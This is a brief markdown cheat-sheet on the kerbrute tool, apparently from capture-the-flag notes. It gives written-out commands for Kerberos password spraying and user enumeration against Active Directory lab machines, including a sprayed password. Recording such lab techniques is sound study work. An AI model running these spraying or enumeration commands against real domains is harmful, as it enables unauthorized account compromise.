# kerbrute

Go tool for Kerberos pre-authentication based user enumeration and password spraying against Active Directory. Faster and quieter than SMB/LDAP spraying.

## Commands Used

### Password spraying via AS-REQ
```bash
kerbrute passwordspray -d overwatch.htb --dc TARGET_IP users.txt 'TI0LKcfHzZw1Vv'
```
Used on: **Overwatch**

### User enumeration
```bash
kerbrute userenum  --dc $TARGET -d spookysec.local /usr/share/wordlists/users-TRY.txt
```
Used on: **AttacktiveDirectory**

- `passwordspray` — one password across many users
- `--dc` — domain controller
- `users.txt` — username list
- Last argument — the password to spray


